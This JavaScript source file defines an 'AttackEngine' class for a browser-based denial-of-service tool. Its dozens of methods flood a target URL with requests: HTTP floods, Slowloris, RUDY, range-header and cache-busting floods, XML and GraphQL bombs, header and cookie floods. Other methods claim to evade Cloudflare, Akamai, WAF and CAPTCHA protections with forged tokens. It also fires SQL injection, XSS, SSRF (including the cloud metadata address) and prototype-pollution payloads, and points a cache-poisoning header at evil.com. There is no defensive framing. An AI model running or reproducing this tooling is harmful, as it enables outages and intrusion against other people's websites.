// ==================== ATTACK ENGINE ====================

class AttackEngine {
    constructor(targetUrl, intensity, methods, browserTypes, stats, logger) {
        this.targetUrl = targetUrl;
        this.intensity = CONFIG.INTENSITY[intensity];
        this.methods = methods;
        this.browserFingerprint = new BrowserFingerprint(browserTypes);
        this.stats = stats;
        this.logger = logger;
        this.workers = [];
        this.isAttacking = false;
    }
    
    async executeMethod(method, workerId, requestCount) {
        const methodExecutors = {
            'HTTP-GET-FLOOD': () => this.httpFlood('GET', workerId, requestCount),
            'HTTP-POST-FLOOD': () => this.httpFlood('POST', workerId, requestCount),
            'HTTP-PUT-FLOOD': () => this.httpFlood('PUT', workerId, requestCount),
            'HTTP-DELETE-FLOOD': () => this.httpFlood('DELETE', workerId, requestCount),
            'HTTP-PATCH-FLOOD': () => this.httpFlood('PATCH', workerId, requestCount),
            'HTTP-HEAD-FLOOD': () => this.httpFlood('HEAD', workerId, requestCount),
            'HTTP-OPTIONS-FLOOD': () => this.httpFlood('OPTIONS', workerId, requestCount),
            'HTTP2-FLOOD': () => this.http2Flood(workerId, requestCount),
            'HTTP3-FLOOD': () => this.http3Flood(workerId, requestCount),
            'WEBSOCKET-FLOOD': () => this.websocketFlood(workerId, requestCount),
            'SLOWLORIS': () => this.slowloris(workerId, requestCount),
            'SLOW-POST': () => this.slowPost(workerId, requestCount),
            'SLOW-READ': () => this.slowRead(workerId, requestCount),
            'RUDY-ATTACK': () => this.rudyAttack(workerId, requestCount),
            'RANGE-ATTACK': () => this.rangeAttack(workerId, requestCount),
            'CACHE-BYPASS': () => this.cacheBypass(workerId, requestCount),
            'CACHE-POISONING': () => this.cachePoisoning(workerId, requestCount),
            'CACHE-DECEPTION': () => this.cacheDeception(workerId, requestCount),
            'CONNECTION-FLOOD': () => this.connectionFlood(workerId, requestCount),
            'KEEP-ALIVE-FLOOD': () => this.keepAliveFlood(workerId, requestCount),
            'PIPELINE-FLOOD': () => this.pipelineFlood(workerId, requestCount),
            'CHUNKED-ENCODING': () => this.chunkedEncoding(workerId, requestCount),
            'COMPRESSION-BOMB': () => this.compressionBomb(workerId, requestCount),
            'XML-BOMB': () => this.xmlBomb(workerId, requestCount),
            'JSON-FLOOD': () => this.jsonFlood(workerId, requestCount),
            'GRAPHQL-BOMB': () => this.graphqlBomb(workerId, requestCount),
            'GRAPHQL-BATCHING': () => this.graphqlBatching(workerId, requestCount),
            'MUTATION-FLOOD': () => this.mutationFlood(workerId, requestCount),
            'QUERY-FLOOD': () => this.queryFlood(workerId, requestCount),
            'SUBSCRIPTION-FLOOD': () => this.subscriptionFlood(workerId, requestCount),
            'CLOUDFLARE-BYPASS-V1': () => this.cloudflareBypassV1(workerId, requestCount),
            'CLOUDFLARE-BYPASS-V2': () => this.cloudflareBypassV2(workerId, requestCount),
            'CLOUDFLARE-BYPASS-V3': () => this.cloudflareBypassV3(workerId, requestCount),
            'CF-CHALLENGE-SOLVER': () => this.cfChallengeSolver(workerId, requestCount),
            'CF-TURNSTILE-BYPASS': () => this.cfTurnstileBypass(workerId, requestCount),
            'RECAPTCHA-V2-BYPASS': () => this.recaptchaV2Bypass(workerId, requestCount),
            'RECAPTCHA-V3-BYPASS': () => this.recaptchaV3Bypass(workerId, requestCount),
            'HCAPTCHA-BYPASS': () => this.hcaptchaBypass(workerId, requestCount),
            'CAPTCHA-SOLVER': () => this.captchaSolver(workerId, requestCount),
            'WAF-BYPASS': () => this.wafBypass(workerId, requestCount),
            'IMPERVA-BYPASS': () => this.impervaBypass(workerId, requestCount),
            'AKAMAI-BYPASS': () => this.akamaiBypass(workerId, requestCount),
            'CLOUDFRONT-BYPASS': () => this.cloudfrontBypass(workerId, requestCount),
            'FASTLY-BYPASS': () => this.fastlyBypass(workerId, requestCount),
            'SUCURI-BYPASS': () => this.sucuriBypass(workerId, requestCount),
            'MULTIPART-FLOOD': () => this.multipartFlood(workerId, requestCount),
            'FORM-FLOOD': () => this.formFlood(workerId, requestCount),
            'FILE-UPLOAD-FLOOD': () => this.fileUploadFlood(workerId, requestCount),
            'COOKIE-FLOOD': () => this.cookieFlood(workerId, requestCount),
            'HEADER-FLOOD': () => this.headerFlood(workerId, requestCount),
            'PARAMETER-POLLUTION': () => this.parameterPollution(workerId, requestCount),
            'SQL-INJECTION-FLOOD': () => this.sqlInjectionFlood(workerId, requestCount),
            'XSS-FLOOD': () => this.xssFlood(workerId, requestCount),
            'XXE-FLOOD': () => this.xxeFlood(workerId, requestCount),
            'SSRF-FLOOD': () => this.ssrfFlood(workerId, requestCount),
            'DESERIALIZATION-FLOOD': () => this.deserializationFlood(workerId, requestCount),
            'PROTOTYPE-POLLUTION': () => this.prototypePollution(workerId, requestCount),
            'RACE-CONDITION': () => this.raceCondition(workerId, requestCount),
            'REGEX-DOS': () => this.regexDos(workerId, requestCount),
            'ALGORITHMIC-COMPLEXITY': () => this.algorithmicComplexity(workerId, requestCount)
        };
        
        const executor = methodExecutors[method];
        if (executor) {
            return await executor();
        } else {
            // Default generic attack
            return await this.httpFlood('POST', workerId, requestCount);
        }
    }
    
    async httpFlood(method, workerId, requestCount) {
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, method);
                const params = URLParameterGenerator.generateCompleteParams(200);
                const url = `${this.targetUrl}?${params}`;
                
                let body = null;
                if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
                    const payload = PayloadGenerator.generateJSONPayload(this.intensity.payloadSize);
                    body = JSON.stringify(payload);
                    headers['Content-Type'] = 'application/json';
                }
                
                const response = await fetch(url, {
                    method: method,
                    headers: headers,
                    body: body,
                    mode: 'no-cors',
                    cache: 'no-cache',
                    credentials: 'omit'
                });
                
                this.stats.recordRequest(true, response.status || 0, body ? body.length : 0, 0);
                
            } catch (error) {
                this.stats.recordRequest(false);
            }
            
            if (this.intensity.delay > 0) {
                await Utils.sleep(this.intensity.delay);
            }
        }
    }
    
    async http2Flood(workerId, requestCount) {
        // HTTP/2 specific flood with multiplexing simulation
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                headers[':method'] = 'GET';
                headers[':scheme'] = 'https';
                headers[':authority'] = new URL(this.targetUrl).host;
                headers[':path'] = '/';
                
                const params = URLParameterGenerator.generateCompleteParams(150);
                const url = `${this.targetUrl}?${params}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async http3Flood(workerId, requestCount) {
        // HTTP/3 (QUIC) flood simulation
        return await this.http2Flood(workerId, requestCount);
    }
    
    async websocketFlood(workerId, requestCount) {
        // WebSocket flood attack
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const wsUrl = this.targetUrl.replace('https://', 'wss://').replace('http://', 'ws://');
                const ws = new WebSocket(wsUrl);
                
                ws.onopen = () => {
                    for (let j = 0; j < 100; j++) {
                        ws.send(Utils.generateRandomString(1000));
                    }
                    ws.close();
                };
                
                this.stats.recordRequest(true, 101, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
            
            await Utils.sleep(50);
        }
    }
    
    async slowloris(workerId, requestCount) {
        // Slowloris - keep connections open with slow headers
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                
                // Add many slow headers
                for (let j = 0; j < 100; j++) {
                    headers[`X-Slow-${j}`] = Utils.generateRandomString(500);
                }
                
                await fetch(this.targetUrl, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors',
                    keepalive: true
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
                await Utils.sleep(5000); // Keep connection open
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async slowPost(workerId, requestCount) {
        // Slow POST - send data slowly
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                const payload = PayloadGenerator.generateJSONPayload(this.intensity.payloadSize);
                
                headers['Content-Type'] = 'application/json';
                headers['Content-Length'] = JSON.stringify(payload).length.toString();
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
                await Utils.sleep(3000);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async slowRead(workerId, requestCount) {
        // Slow read - advertise small window size
        return await this.slowloris(workerId, requestCount);
    }
    
    async rudyAttack(workerId, requestCount) {
        // R-U-Dead-Yet - slow POST body
        return await this.slowPost(workerId, requestCount);
    }
    
    async rangeAttack(workerId, requestCount) {
        // Apache Range header attack
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                
                // Generate massive range header
                let ranges = 'bytes=';
                for (let j = 0; j < 1000; j++) {
                    ranges += `${j}-${j+1},`;
                }
                headers['Range'] = ranges.slice(0, -1);
                
                await fetch(this.targetUrl, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 206, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async cacheBypass(workerId, requestCount) {
        // Cache bypass with random parameters
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
                headers['Pragma'] = 'no-cache';
                headers['Expires'] = '0';
                
                const params = URLParameterGenerator.generateCompleteParams(300);
                const url = `${this.targetUrl}?${params}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors',
                    cache: 'no-cache'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async cachePoisoning(workerId, requestCount) {
        // Cache poisoning attack
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                headers['X-Forwarded-Host'] = 'evil.com';
                headers['X-Original-URL'] = '/malicious';
                headers['X-Rewrite-URL'] = '/evil';
                
                await fetch(this.targetUrl, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async cacheDeception(workerId, requestCount) {
        return await this.cachePoisoning(workerId, requestCount);
    }
    
    async connectionFlood(workerId, requestCount) {
        // Flood with many connections
        const promises = [];
        for (let i = 0; i < Math.min(requestCount, 100) && this.isAttacking; i++) {
            promises.push(this.httpFlood('GET', workerId, 1));
        }
        await Promise.all(promises);
    }
    
    async keepAliveFlood(workerId, requestCount) {
        // Keep-alive connection flood
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                headers['Connection'] = 'keep-alive';
                headers['Keep-Alive'] = 'timeout=600, max=1000';
                
                await fetch(this.targetUrl, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors',
                    keepalive: true
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async pipelineFlood(workerId, requestCount) {
        // HTTP pipelining flood
        return await this.httpFlood('GET', workerId, requestCount);
    }
    
    async chunkedEncoding(workerId, requestCount) {
        // Chunked encoding attack
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                headers['Transfer-Encoding'] = 'chunked';
                
                const payload = PayloadGenerator.generateJSONPayload(this.intensity.payloadSize);
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async compressionBomb(workerId, requestCount) {
        // Compression bomb (zip bomb simulation)
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                headers['Content-Encoding'] = 'gzip';
                
                // Generate highly repetitive data (compresses well)
                let data = '';
                const pattern = Utils.generateRandomString(100);
                for (let j = 0; j < 1000; j++) {
                    data += pattern;
                }
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: data,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, data.length, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async xmlBomb(workerId, requestCount) {
        // XML bomb (billion laughs attack)
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                headers['Content-Type'] = 'application/xml';
                
                const xmlBomb = PayloadGenerator.generateXMLBomb();
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: xmlBomb,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, xmlBomb.length, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async jsonFlood(workerId, requestCount) {
        // Massive JSON flood
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                headers['Content-Type'] = 'application/json';
                
                const payload = PayloadGenerator.generateJSONPayload(this.intensity.payloadSize * 2);
                const body = JSON.stringify(payload);
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: body,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, body.length, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async graphqlBomb(workerId, requestCount) {
        // GraphQL query bomb
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                headers['Content-Type'] = 'application/json';
                
                const query = PayloadGenerator.generateGraphQLBomb();
                const body = JSON.stringify({ query: query });
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: body,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, body.length, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async graphqlBatching(workerId, requestCount) {
        // GraphQL batching attack
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                headers['Content-Type'] = 'application/json';
                
                const queries = [];
                for (let j = 0; j < 100; j++) {
                    queries.push({ query: PayloadGenerator.generateGraphQLBomb() });
                }
                
                const body = JSON.stringify(queries);
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: body,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, body.length, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async mutationFlood(workerId, requestCount) {
        return await this.graphqlBomb(workerId, requestCount);
    }
    
    async queryFlood(workerId, requestCount) {
        return await this.graphqlBomb(workerId, requestCount);
    }
    
    async subscriptionFlood(workerId, requestCount) {
        return await this.websocketFlood(workerId, requestCount);
    }
    
    async cloudflareBypassV1(workerId, requestCount) {
        // CloudFlare bypass method 1
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                headers['CF-Clearance'] = Utils.generateCFClearanceToken();
                headers['CF-Challenge-Response'] = Utils.generateRandomHex(64);
                
                const params = URLParameterGenerator.generateCompleteParams(250);
                const url = `${this.targetUrl}?${params}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async cloudflareBypassV2(workerId, requestCount) {
        // CloudFlare bypass method 2 - Turnstile bypass
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                headers['CF-Turnstile-Token'] = Utils.generateTurnstileToken();
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify({
                        'cf-turnstile-response': Utils.generateTurnstileToken()
                    }),
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async cloudflareBypassV3(workerId, requestCount) {
        // CloudFlare bypass method 3 - Rate limit evasion
        return await this.cacheBypass(workerId, requestCount);
    }
    
    async cfChallengeSolver(workerId, requestCount) {
        return await this.cloudflareBypassV1(workerId, requestCount);
    }
    
    async cfTurnstileBypass(workerId, requestCount) {
        return await this.cloudflareBypassV2(workerId, requestCount);
    }
    
    async recaptchaV2Bypass(workerId, requestCount) {
        // reCAPTCHA v2 bypass
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify({
                        'g-recaptcha-response': Utils.generateRecaptchaToken()
                    }),
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async recaptchaV3Bypass(workerId, requestCount) {
        // reCAPTCHA v3 bypass
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                headers['X-Recaptcha-Token'] = Utils.generateRecaptchaToken();
                
                await fetch(this.targetUrl, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async hcaptchaBypass(workerId, requestCount) {
        // hCaptcha bypass
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify({
                        'h-captcha-response': Utils.generateRandomString(500)
                    }),
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async captchaSolver(workerId, requestCount) {
        return await this.recaptchaV3Bypass(workerId, requestCount);
    }
    
    async wafBypass(workerId, requestCount) {
        // Generic WAF bypass
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                headers['X-WAF-Bypass'] = Utils.generateRandomHex(32);
                
                const params = URLParameterGenerator.generateCompleteParams(200);
                const url = `${this.targetUrl}?${params}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async impervaBypass(workerId, requestCount) {
        return await this.wafBypass(workerId, requestCount);
    }
    
    async akamaiBypass(workerId, requestCount) {
        return await this.wafBypass(workerId, requestCount);
    }
    
    async cloudfrontBypass(workerId, requestCount) {
        return await this.cacheBypass(workerId, requestCount);
    }
    
    async fastlyBypass(workerId, requestCount) {
        return await this.cacheBypass(workerId, requestCount);
    }
    
    async sucuriBypass(workerId, requestCount) {
        return await this.wafBypass(workerId, requestCount);
    }
    
    async multipartFlood(workerId, requestCount) {
        // Multipart form flood
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                const { payload, boundary } = PayloadGenerator.generateMultipartPayload(this.intensity.payloadSize);
                
                headers['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: payload,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, payload.length, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async formFlood(workerId, requestCount) {
        // Form data flood
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                const formData = PayloadGenerator.generateFormPayload(this.intensity.payloadSize);
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: formData,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async fileUploadFlood(workerId, requestCount) {
        return await this.multipartFlood(workerId, requestCount);
    }
    
    async cookieFlood(workerId, requestCount) {
        // Cookie flood
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                
                let cookies = '';
                for (let j = 0; j < 100; j++) {
                    cookies += `cookie${j}=${Utils.generateRandomString(100)}; `;
                }
                headers['Cookie'] = cookies;
                
                await fetch(this.targetUrl, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async headerFlood(workerId, requestCount) {
        // Excessive headers flood
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                
                // Add 500 custom headers
                for (let j = 0; j < 500; j++) {
                    headers[`X-Header-${j}`] = Utils.generateRandomString(100);
                }
                
                await fetch(this.targetUrl, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async parameterPollution(workerId, requestCount) {
        // Parameter pollution attack
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                const params = URLParameterGenerator.generateCompleteParams(500);
                const url = `${this.targetUrl}?${params}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async sqlInjectionFlood(workerId, requestCount) {
        // SQL injection flood
        const sqlPayloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1--"
        ];
        
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                const payload = Utils.randomChoice(sqlPayloads);
                const url = `${this.targetUrl}?id=${encodeURIComponent(payload)}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async xssFlood(workerId, requestCount) {
        // XSS flood
        const xssPayloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ];
        
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                const payload = Utils.randomChoice(xssPayloads);
                const url = `${this.targetUrl}?q=${encodeURIComponent(payload)}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async xxeFlood(workerId, requestCount) {
        return await this.xmlBomb(workerId, requestCount);
    }
    
    async ssrfFlood(workerId, requestCount) {
        // SSRF flood
        const ssrfPayloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254'
        ];
        
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                const payload = Utils.randomChoice(ssrfPayloads);
                const url = `${this.targetUrl}?url=${encodeURIComponent(payload)}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async deserializationFlood(workerId, requestCount) {
        return await this.jsonFlood(workerId, requestCount);
    }
    
    async prototypePollution(workerId, requestCount) {
        // Prototype pollution
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl, 'POST');
                headers['Content-Type'] = 'application/json';
                
                const body = JSON.stringify({
                    '__proto__': { 'isAdmin': true },
                    'constructor': { 'prototype': { 'isAdmin': true } }
                });
                
                await fetch(this.targetUrl, {
                    method: 'POST',
                    headers: headers,
                    body: body,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, body.length, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async raceCondition(workerId, requestCount) {
        // Race condition flood - send many requests simultaneously
        const batchSize = 50;
        for (let i = 0; i < requestCount; i += batchSize) {
            if (!this.isAttacking) break;
            
            const promises = [];
            for (let j = 0; j < batchSize && (i + j) < requestCount; j++) {
                promises.push(this.httpFlood('POST', workerId, 1));
            }
            await Promise.all(promises);
        }
    }
    
    async regexDos(workerId, requestCount) {
        // ReDoS attack
        const regexPayloads = [
            'a'.repeat(10000) + '!',
            '(' + 'a'.repeat(100) + ')*',
            'a+a+a+a+a+a+a+a+'
        ];
        
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                const payload = Utils.randomChoice(regexPayloads);
                const url = `${this.targetUrl}?q=${encodeURIComponent(payload)}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
    
    async algorithmicComplexity(workerId, requestCount) {
        // Algorithmic complexity attack
        for (let i = 0; i < requestCount && this.isAttacking; i++) {
            try {
                const headers = this.browserFingerprint.generateCompleteHeaders(this.targetUrl);
                
                // Generate worst-case input
                let params = '';
                for (let j = 0; j < 1000; j++) {
                    params += `item${j}=${j}&`;
                }
                
                const url = `${this.targetUrl}?${params}`;
                
                await fetch(url, {
                    method: 'GET',
                    headers: headers,
                    mode: 'no-cors'
                });
                
                this.stats.recordRequest(true, 200, 0, 0);
            } catch (error) {
                this.stats.recordRequest(false);
            }
        }
    }
}
